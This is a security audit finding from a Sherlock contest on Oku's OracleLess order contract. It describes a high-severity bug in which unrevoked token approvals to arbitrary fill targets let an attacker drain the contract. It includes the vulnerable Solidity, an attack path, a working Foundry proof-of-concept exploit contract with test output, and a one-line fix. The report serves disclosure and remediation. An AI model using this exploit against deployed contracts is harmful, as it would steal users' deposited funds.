---
tags:
  - lang/solidity
  - sector/dex
  - sector/oracle
  - sector/token
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Oku'S New Order Types Contract Contest]]"
auditors:
  - "[[0x0x0xw3]]"
report: "https://github.com/sherlock-audit/2024-11-oku-judging"
genome:
  - "[[wrong-condition]]"
  - "[[direct-drain]]"
  - "[[fot-slippage]]"
  - "[[oracle-freshness]]"
---
# H-6: Failure to reset unspent approval to the target address will lead to the wiping of the smart contract balance

- id: 44376
- impact: HIGH
- protocol: [[Oku'S New Order Types Contract Contest]]
- reporter: 0x0x0xw3 (Sherlock)
- source: N/A

## Summary


This bug report discusses an issue with a smart contract that can lead to the loss of funds. The contract gives arbitrary approval to untrusted contracts when filling orders, and these approvals are not always revoked when they are not fully used. This means that a malicious contract can use these unused approvals to steal funds. The root cause is the failure to set approval to zero after the call to the target contract. This can be exploited by creating a malicious contract and filling orders with it multiple times to steal all the funds in the contract. The impact of this bug is the loss of the entire contract balance. A proof of concept is provided to demonstrate the vulnerability. To mitigate this issue, the contract needs to be updated to set the approval to zero after the call to the target contract. 

## Details

Source: https://github.com/sherlock-audit/2024-11-oku-judging/issues/745 

## Found by 
0x007, 0x0x0xw3, 0x37, 0xaxaxa, 0xc0ffEE, 0xmujahid002, Boy2000, Contest-Squad, KungFuPanda, ami, durov, etherhood, iamandreiski, joshuajee, t.aksoy, tobi0x18, vinica\_boy, whitehair0330
### Summary

The contract gives arbitrary approval to untrusted contracts when filling orders, these approvals don't need to be fully utilized, and in situations where the approvals are not fully used they are not revoked, worst the order creator gets refunded for all unspent tokens. This leaves a malicious contract with unused approvals that they can use to steal funds. This attack is very easy to perform and can be done multiple times.

### Root Cause

The root cause is the failure to set approval to zero after the call to the `target` contract.

https://github.com/sherlock-audit/2024-11-oku/blob/main/oku-custom-order-types/contracts/automatedTrigger/OracleLess.sol#L240

```solidity
    function execute(
        address target,
        bytes calldata txData,
        Order memory order
    ) internal returns (uint256 amountOut, uint256 tokenInRefund) {
        //update accounting
        uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
        uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));

        //approve
 @->       order.tokenIn.safeApprove(target, order.amountIn);

        //perform the call
        (bool success, bytes memory reason) = target.call(txData);

        if (!success) {
            revert TransactionFailed(reason);
        }

        uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
        uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));

        require(
            finalTokenOut - initialTokenOut > order.minAmountOut,
            "Too Little Received"
        );

        amountOut = finalTokenOut - initialTokenOut;
        tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
    }
```

### Internal pre-conditions

There are pending orders in the contract, for example worth 100 ETH;,

### External pre-conditions

_No response_

### Attack Path

1. Attacker creates a malicious contract like the one on my POC
2. Attacker creates an order with 1 ETH, but the min amount out will be 1 wei
3. Attacker Fills their order immediately with the malicious contract.
4. By doing this the attack has earn approximately 1 ETH, they can do this multiple times to steal everything.

### Impact

1. The whole contract balance will be lost to the attacker.
2. Similar issue is on the Bracket Contract

### PoC

The output of the POC below shows that the attacker almost doubled their initial balance by performing this action.

```bash
[PASS] testAttack() (gas: 435837)
Logs:
  ATTACKER BALANCE BEFORE ATTACK :  100000000000000000000
  MALICIOUS CONTRACT ALLOWANCE   :  99999999999999999999
  ATTACK BALANCE AFTER ATTACK    :  199999999999999999998
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {ERC20Mock} from "openzeppelin-contracts/contracts/mocks/token/ERC20Mock.sol";
import { AutomationMaster } from "../contracts/automatedTrigger/AutomationMaster.sol";
import { OracleLess } from "../contracts/automatedTrigger/OracleLess.sol";
import "../contracts/interfaces/uniswapV3/IPermit2.sol";
import "../contracts/interfaces/openzeppelin/ERC20.sol";
import "../contracts/interfaces/openzeppelin/IERC20.sol";

contract MaliciousTarget {

    IERC20 tokenIn;
    IERC20 tokenOut;

    constructor (IERC20 _tokenIn, IERC20 _tokenOut) {
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
        
    }

    fallback () external payable {
        tokenIn.transferFrom(msg.sender, address(this), 1);
        tokenOut.transfer(msg.sender, 1);
    }

    function spendAllowance(address victim) external {
        tokenIn.transferFrom(victim, msg.sender, 100 ether - 1);
    }


}


contract PocTest2 is Test {

    AutomationMaster automationMaster;
    OracleLess oracleLess;
    IPermit2 permit2;
    IERC20 tokenIn;
    IERC20 tokenOut;
    MaliciousTarget target;

    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");

    function setUp() public {
    
        automationMaster = new AutomationMaster();
        oracleLess = new OracleLess(automationMaster, permit2);
        tokenIn = IERC20(address(new ERC20Mock()));
        tokenOut = IERC20(address(new ERC20Mock()));

        target = new MaliciousTarget(tokenIn, tokenOut);
        //MINT
        ERC20Mock(address(tokenIn)).mint(alice, 100 ether);
        ERC20Mock(address(tokenIn)).mint(attacker, 100 ether);
        ERC20Mock(address(tokenOut)).mint(address(target), 1);

    }

    function testAttack() public {
        uint96 orderId;
        //Innocent User
        vm.startPrank(alice);
        tokenIn.approve(address(oracleLess), 100 ether);
        orderId = oracleLess.createOrder(tokenIn, tokenIn, 100 ether, 9 ether, alice, 1, false, '0x0');
        vm.stopPrank();

        //Attacker

        console.log("ATTACKER BALANCE BEFORE ATTACK : ", tokenIn.balanceOf(attacker));
        vm.startPrank(attacker);
        tokenIn.approve(address(oracleLess), 100 ether);
        orderId = oracleLess.createOrder(tokenIn, tokenOut, 100 ether, 0, attacker, 1, false, '0x0');

        oracleLess.fillOrder(1, orderId, address(target), "0x");

        console.log("MALICIOUS CONTRACT ALLOWANCE   : ",tokenIn.allowance(address(oracleLess), address(target)));

        //Spend allowance

        target.spendAllowance(address(oracleLess));

        console.log("ATTACK BALANCE AFTER ATTACK    : ", tokenIn.balanceOf(attacker));

        vm.stopPrank();

    }



}
```

### Mitigation

```diff
    function execute(
        address target,
        bytes calldata txData,
        Order memory order
    ) internal returns (uint256 amountOut, uint256 tokenInRefund) {
        //update accounting
        uint256 initialTokenIn = order.tokenIn.balanceOf(address(this));
        uint256 initialTokenOut = order.tokenOut.balanceOf(address(this));

        //approve
        order.tokenIn.safeApprove(target, order.amountIn);

        //perform the call
        (bool success, bytes memory reason) = target.call(txData);

        if (!success) {
            revert TransactionFailed(reason);
        }

+      order.tokenIn.safeApprove(target, 0);

        uint256 finalTokenIn = order.tokenIn.balanceOf(address(this));
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
        uint256 finalTokenOut = order.tokenOut.balanceOf(address(this));

        require(
            finalTokenOut - initialTokenOut > order.minAmountOut,
            "Too Little Received"
        );

        amountOut = finalTokenOut - initialTokenOut;
        tokenInRefund = order.amountIn - (initialTokenIn - finalTokenIn);
    }
```
